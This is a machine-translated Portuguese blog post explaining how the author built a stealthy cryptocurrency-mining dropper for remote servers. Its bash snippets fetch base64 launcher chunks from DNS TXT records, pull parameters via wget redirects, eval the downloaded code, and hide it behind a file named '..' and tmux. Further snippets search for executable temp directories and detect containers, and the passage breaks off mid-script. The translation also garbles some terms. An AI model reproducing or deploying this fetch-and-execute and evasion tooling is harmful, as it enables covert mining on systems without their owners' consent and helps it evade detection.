<!doctypehtml><html prefix="og: https://ogp.me/ns# article: http://ogp.me/ns/article# website: http://ogp.me/ns/website#"lang=pt><meta charset=UTF-8><meta content=width=device-width,initial-scale=1 name=viewport><link href=https://www.unto.re/pt/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><link title="site do desenterrar"href=https://www.unto.re/feed.xml rel=alternate type=application/rss+xml><link href=https://www.unto.re/amp/pt/posts/chronichles_of_a_cryptonote_dropper/ rel=amphtml><meta content="untoreh's site"property=og:title><meta content=website property=og:type><meta content=https://www.unto.re property=og:url><meta content=https://www.unto.re/assets/appa.png property=og:image><meta content="Articles, logs, infos, status and live updates are published here."property=og:description><meta content=English property=og:locale><meta content=English property=og:locale:alternate><meta content=German property=og:locale:alternate><meta content=Italian property=og:locale:alternate><meta content="Mandarin Chinese"property=og:locale:alternate><meta content=Spanish property=og:locale:alternate><meta content=Hindi property=og:locale:alternate><meta content=Arabic property=og:locale:alternate><meta content=Portuguese property=og:locale:alternate><meta content=Bengali property=og:locale:alternate><meta content=Russian property=og:locale:alternate><meta content=Japanese property=og:locale:alternate><meta content=Punjabi property=og:locale:alternate><meta content=Javanese property=og:locale:alternate><meta content=Vietnamese property=og:locale:alternate><meta content=French property=og:locale:alternate><meta content=Urdu property=og:locale:alternate><meta content=Turkish property=og:locale:alternate><meta content=Polish property=og:locale:alternate><meta content=Ukranian property=og:locale:alternate><meta content=Dutch property=og:locale:alternate><meta content=Greek property=og:locale:alternate><meta content=Swedish property=og:locale:alternate><meta content=Zulu property=og:locale:alternate><meta content=Romanian property=og:locale:alternate><meta content=Malay property=og:locale:alternate><meta content=Korean property=og:locale:alternate><meta content=Thai property=og:locale:alternate><meta content=Filipino property=og:locale:alternate><meta content=summary name=twitter:card><meta content=@untoreh name=twitter:creator><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/libs/highlight/github.min.css rel=stylesheet><link href=/css/franklin.css rel=stylesheet><link href=/css/main.css rel=stylesheet><link href=/css/menu.css rel=stylesheet><link href=/css/pages.css rel=stylesheet><link href=/css/lunr.css rel=stylesheet><link href=/css/footer.css rel=stylesheet><link href=/css/responsive.css rel=stylesheet><link href=/css/animations.css rel=stylesheet><link href=/css/docco.css rel=stylesheet><link href=/css/flags-sprite.css rel=stylesheet><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> Crônicas de um conta-gotas de criptonota</title><meta content="...How far are you willing to go for...pennies?"name=description><script src=/libs/load.js></script><script type=application/ld+json>{"url":"/pt/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/pt/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-10-26T18:54:48.371","inLanguage":"pt","name":"","mainEntityOfPage":{"@id":"/pt/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/pt/></a><div class=author__wrap><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><ul><li class=author__avatar onclick=toggleTheme()><img alt=" desabrochar luz"class=flip-front src=/assets/appa.png><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Pesquisar site"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/pt/posts/><i class="fas fa-pen menu-icons"></i> Postagens</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/pt/media/><i class="fas fa-tv menu-icons"></i> meios de comunicação</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div><button name="Website Menu"class=ham type=button><i class="fas fa-bars ham-icon"></i></button><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><form class=lunrSearchForm name=lunrSearchForm><button title="Pesquisar site"class=search-button formaction=/search/index.html value=Search><i class="fas fa-search menu-icons"></i></button><input class=search-input name=q placeholder=Search…></form><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/pt/posts/><i class="fas fa-pen menu-icons"></i> Postagens</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/pt/media/><i class="fas fa-tv menu-icons"></i> meios de comunicação</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"><button title="Languages Menu"class=langs-dropdown-wrapper type=button><i class="fas fa-language menu-icons"></i> Lang <div class="langs-dropdown-content langs-dropdown-menu"><ul class=lang-list><a class="lang-link lang-ar"href=/ar/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-sa"></span>Arabic</a><a class="lang-link lang-bn"href=/bn/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-bd"></span>Bengali</a><a class="lang-link lang-nl"href=/nl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-nl"></span>Dutch</a><a class="lang-link lang-en"href=/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gb"></span>English</a><a class="lang-link lang-tl"href=/tl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ph"></span>Filipino</a><a class="lang-link lang-fr"href=/fr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-fr"></span>French</a><a class="lang-link lang-de"href=/de/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-de"></span>German</a><a class="lang-link lang-el"href=/el/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-gr"></span>Greek</a><a class="lang-link lang-hi"href=/hi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Hindi</a><a class="lang-link lang-it"href=/it/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-it"></span>Italian</a><a class="lang-link lang-ja"href=/ja/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-jp"></span>Japanese</a><a class="lang-link lang-jw"href=/jw/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-id"></span>Javanese</a><a class="lang-link lang-ko"href=/ko/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-kr"></span>Korean</a><a class="lang-link lang-ms"href=/ms/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ms"></span>Malay</a><a class="lang-link lang-zh"href=/zh/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link lang-pl"href=/pl/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pl"></span>Polish</a><a class="lang-link lang-pt"href=/pt/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link lang-pa"href=/pa/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-in"></span>Punjabi</a><a class="lang-link lang-ro"href=/ro/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ro"></span>Romanian</a><a class="lang-link lang-ru"href=/ru/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ru"></span>Russian</a><a class="lang-link lang-es"href=/es/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-es"></span>Spanish</a><a class="lang-link lang-sv"href=/sv/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-se"></span>Swedish</a><a class="lang-link lang-th"href=/th/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-th"></span>Thai</a><a class="lang-link lang-tr"href=/tr/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-tr"></span>Turkish</a><a class="lang-link lang-uk"href=/uk/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link lang-ur"href=/ur/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-pk"></span>Urdu</a><a class="lang-link lang-vi"href=/vi/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link lang-zu"href=/zu/posts/chronichles_of_a_cryptonote_dropper><span class="flag flag-za"></span>Zulu</a></ul></div></button></ul></div></nav></div></div></div><div><h1 id=title><a href=/pt/posts/chronichles_of_a_cryptonote_dropper> Crônicas de um conta-gotas de criptonota</a></h1><blockquote id=page-description style=font-style:italic>... Até onde você está disposto a ir por ... centavos?</blockquote></div><div class=franklin-content><p>Suponha que você queira o meu<a href=https://en.wikipedia.org/wiki/Cryptocurrency> criptomoedas</a> no remoto<em> virtual</em> hardware. Você precisa encontrar algo para mim. Servidores remotos significam, não<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> ou algoritmos de prova de trabalho da GPU, basicamente apenas<a href=\posts/a-few-notes-on-proof-of-work> Moedas amigáveis ​​para CPU</a>.<h2 id=the_software><a class=header-anchor href=#the_software> O software</a></h2><p>Pesquise e encontre um<a href=https://github.com/xmrig/xmrig> mineiro</a> , mas não é muito bom, você gostaria de algo que pudesse controlar melhor remotamente, então você acha<a href=https://github.com/Bendr0id/xmrigCC> outro mineiro</a> . Você também quer um<a href=https://github.com/Bendr0id/xmrigcc-proxy> procuração</a> , porque muitas conexões serão de curta duração, você não quer<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> dos</a> sua piscina de mineração. Também um<a href=https://github.com/search?q=tunnel> túnel</a> seria bom.<h2 id=the_design><a class=header-anchor href=#the_design> O design</a></h2><p>Alguns botnets usam dados de blockchains para pesquisar comandos,<a href=https://twitter.com/sarahjamielewis> alguém</a> também parece ter<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> apostas perdidas</a> sobre isso não acontecer de novo ... de qualquer forma, não somos tão sofisticados, vamos sobreviver com alguns registros DNS que armazenam um script que puxa a carga que se auto-extrai em um diretório temporário executa e sai<em> quase</em> nenhum traço de sua configuração. Aqui está um pequeno fluxograma que descreve a estrutura</p><img src=/assets/posts/output/payload.png><h2 id=launcher><a class=header-anchor href=#launcher> Lançador</a></h2><p>O objetivo de um script de inicialização deve ser acessível e facilmente atualizável, de forma que resista ao teste do tempo. Atualizando<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> registros é fácil e DNS é a última coisa que é desligada dentro de uma rede ... porque os endereços IP são difíceis de lembrar ... então é provável que ele esteja disponível na maioria das vezes. Você vê quando nós estamos<em> buscando o script de implantação</em>na verdade, já estamos executando alguma lógica, este é o script do iniciador, ele precisa da capacidade de realizar consultas DNS para pesquisar nossos registros, o DNS pode ser onipresente, mas<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> escavação</a> não é.<p>Existe um pequeno enigma aqui, se tivermos que baixar outra ferramenta<em> para baixar outro script para baixar a carga útil</em> devemos apenas baixar a carga útil! Em defesa ... fazer essa dança com script adiciona ofuscação, permite manter apenas uma implementação do iniciador (capacidade de manutenção, sim), não é necessário na maioria das vezes ... então também servimos um<a href=https://en.wikipedia.org/wiki/Standalone_program> estaticamente ligado</a> dig executável para realizar consultas de dns, buscadas por auto-hospedagem ou hospedagem em nuvem (sim, há alternativas, como 3 ou 4, porque os serviços em nuvem têm largura de banda livre mínima e também exigem cookies ou tokens de acesso ... eles são muito script hostil, propositalmente, é claro).<p>O que há nos registros dns? Nós estamos usando<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> registros, em um domínio personalizado (substitutos aqui também). Por que TXT? eles são os que podem armazenar a maior quantidade de dados ... normalmente, uma vez que é uma espécie de<a href=https://www.ietf.org/rfc/rfc6763.txt> recomendado</a> dependendo<em> coisas</em> . Estamos usando especificamente<a href=https://www.cloudflare.com/> Cloudflare</a> para o nosso DNS fiddling, uma vez que é gratuito e praticamente o único jogador na cidade (<em> bem não realmente, mas qualquer outra alternativa empalidece recursos sábios</em> ) Acontece que você pode armazenar vários pedaços de dados no<em> mesmo</em> registro ... isso começa a ficar confuso e embaralhar por algumas especificações ... (tangente) Cloudflare<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> costumava ser</a> permitir<em> acorrentado</em>Registros TXT totalizando ~ 9k bytes, documentos agora indicam ~ 2k bytes, antes da mudança que eu estava usando ~ 6k eu acho, e estava servindo o script descompactado, depois disso eu tive que afinar o script e compactá-lo antes (na verdade, tentei usar um<a href=https://freedns.afraid.org/> Freedns</a> provedor, fui banido dentro de um dia, supondo que eles têm uma política rígida de registros TXT sem gordura), no entanto, a compactação gzip parece NÃO ser compatível com o pipe e ainda estava causando problemas, então eu tive que conseguir enfiar o script sem compactação ( final da tangente).<p>Como podemos armazená-lo? Registros TXT suportam apenas strings alfanuméricas, não<a href=https://en.wikipedia.org/wiki/Null_character> NULs</a> , então temos que envolvê-lo em uma codificação não nula,<a href=https://en.wikipedia.org/wiki/Base64> base64</a> satisfaz essa restrição, e porque estamos armazenando<em> acorrentado</em> Registros TXT, temos que fragmentar a saída, uma vez que estamos usando o material do shell, isso é feito por meio do<code>-w</code> sinalizador, no busybox tal sinalizador costumava estar ausente (ou opt-in) em versões mais antigas, o que era irritante, uma alternativa é usar o codificador junto com o openssl,<code>openssl enc -base64</code>.<p>Agora que sabemos como armazenar nosso script de implantação, nós o armazenamos com qualquer<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> ou manualmente. Como puxamos isso? Mencionamos que precisamos de bindutils ou do nosso próprio<code>dig</code> ... depois de ter escolhido o endpoint de serviço, queremos baixá-lo, o que está disponível geralmente é<a href=https://www.gnu.org/software/wget/> wget</a> ou<a href=https://curl.se/> ondulação</a> , wget é encontrado pré-instalado com muito mais freqüência, no entanto, o busybox só fornece suporte a tls com bibliotecas dinâmicas, então você deve ter certeza de que o endpoint está servindo http ou seu utilitário está<code>wget</code> de gnu-utils<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>Significa tentar<code>-t2</code> tempos de espera<code>-T10</code> segundos sendo<code>-q</code> leitura silenciosa de<code>-i-</code> stdin (<code>$digurl</code> ) e escrevendo para<code>-O-</code> stdout (<code>$filename</code>) Este comando não revela o que estamos baixando à primeira vista. Vamos ser muito cuidadosos com outros comandos do shell pelo mesmo motivo, ou ficar com o shell (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> bash</a> ) integrados sempre que possível. Tome cuidado também sobre onde você está baixando seus executáveis, você deseja garantir que pode executá-los, uma vez que alguns pontos de montagem, especialmente em contêineres e<code>tmp</code> caminhos são<code>noexec</code> . Agora que temos nossa ferramenta de consulta de DNS, buscamos nossos registros<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>Sinalizadores são autoexplicativos aqui,<code>+short</code> apenas significa que estamos interessados ​​apenas nos dados em si, de modo que não precisamos analisar a saída. É importante especificar o servidor DNS, como google (<code>8.8.8.8</code> ) ou cloudflare (<code>1.1.1.1</code> ) porque muitos ambientes redirecionam ou fazem proxy de consultas de DNS para seus próprios servidores de DNS por padrão. Depois de buscar o script em partes, lidamos com aspas e espaços em branco para torná-lo pronto para decodificação<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>E se agora nós<em> ainda</em> não tem nosso lançador? DNS é confuso, queremos um fallback, vamos configurar um subdomínio para buscar o script do iniciador diretamente. Antes de avaliar nosso script, queremos customizá-lo, com algumas variáveis, novamente vamos usar um registro TXT para armazenar uma lista de variáveis ​​NAME = VALUE e analisá-la. Também há um fallback para variáveis, cloudflare oferece redirecionamentos com base em URLs, esses redirecionamentos são servidos<em> antes</em> o destino, então não precisamos de um endpoint, queremos apenas configurar regras de redirecionamento baseadas em regex para um endpoint fictício, o que nos interessa são os parâmetros da url<code>?NAME=VALUE&NAME2=VALUE2...</code>, para que possamos parametrizar nosso iniciador simplesmente mudando o url de redirecionamento, sempre com atenção aos códigos de citação e escape<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>O wget<code>-S</code> imprime o URL de redirecionamento no qual estamos interessados ​​para análise. Tendo os parâmetros e o script, avaliamos as variáveis ​​gravando-as em um arquivo<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>Este arquivo será originado por um script de implantação. A última parte do script de inicialização é para real<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> trampolim</a> , avalie o script dentro do processo shell atual, ou talvez deixe-o ser gerenciado pelo tmux se possível.<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>O script do iniciador é despejado em um arquivo chamado ".." isso parece confuso porque pode ser confundido com um<em> pai</em> diretório. E não incluímos o comando da sessão, já que isso demoraria no comando do processo, em vez disso, iniciamos a sessão do tmux de antemão e enviamos o comando de origem através da interface do terminal do tmux. Relacionado a isso, às vezes chamando um executável com<code>./</code> mantém esses caracteres no comando, por isso é melhor adicionar o<code>$PWD</code> para o caminho ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> The Payload</a></h2><p>Nosso script de implantação começa fornecendo o<code>env.sh</code> arquivo, e manter ou configurar vars como<code>STARTING_*</code> vars gostam<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>Isso nos permite matar e reiniciar uma instância em execução enquanto redefinimos o ambiente. Vamos mudar para um diretório tmp com recursos exec<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>Verificando se dentro de um<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> recipiente</a> também é útil, podemos sondar o sistema de arquivos em busca de dicas<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
